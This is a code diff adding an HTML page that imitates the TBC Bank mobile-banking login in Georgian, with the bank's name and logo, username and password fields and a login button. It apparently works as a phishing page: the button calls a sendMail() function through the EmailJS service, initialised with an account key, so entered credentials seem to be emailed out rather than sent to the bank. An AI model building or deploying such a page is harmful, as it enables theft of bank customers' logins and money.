@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>TBC Online</title>
+    <!--  -->
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <!--  -->
+    <!-- -->
+    <link rel="stylesheet" href="https://cdn.web-fonts.ge/fonts/bpg-le-studio-02-caps/css/bpg-le-studio-02-caps.min.css">
+    <!--  -->
+    <link href="style.css" rel="stylesheet" type="text/css" />
+    <!-- Email -->
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+    <script
+      type="text/javascript">
+      (function() {
+      emailjs.init("user_uUNnBBWOLRfMXRw9Fjj0p");
+      })();
+    </script>
+    <!-- ----------------------------- -->
+  </head>
+
+  <body>
+    <!-- header -->
+    <table>
+      <tbody>
+        <tr>
+         <td class="icons">
+          <img src="navbarwhite.png" alt="" width="40%">
+         </td>
+         <td>
+         <img src="tbcwhitemini.png" alt="" width="30px">
+         <span class="logo"> თიბისი </span>
+           <span class="logo1">  ბანკი
+          </span> 
+         </td>
+         <td class="icons">Eng</td>
+        </tr>
+      </tbody>
+    </table>
+    <!-- ---------------------- -->
+    <!-- content -->
+    <div class="content">
+      <form class="formContent w3-form w3-padding">
+        <p class="hello">მოგესალმებით</p>
+        <p>თიბისი მობაილბანკში</p>
+        <input type="text" class="w3-input w3-section" placeholder="მომხმარებელი">
+        <input type="password" class="w3-input w3-section" placeholder="პაროლი">
+        <div class="checkbox">
+          <input type="checkbox" name="save" class="check">
+          <label for="save">მომხმარებლის დამახსოვრება</label>
+        </div>
+      </form>
+      <div class="w3-section shesvla" onclick="sendMail()">
+        <p>შესვლა</p>
+      </div>
+      <p class="notuser">არ ხართ მომხმარებელი? <a href="">დარეგისტრირდით</a> </p>
+    </div>
+    <!-- bottom -->
+    <div class="bottom content">
+      <p>სრული ვერსია</p>
+    </div>
+    <script src="script.js"></script>
+  </body>
+</html>
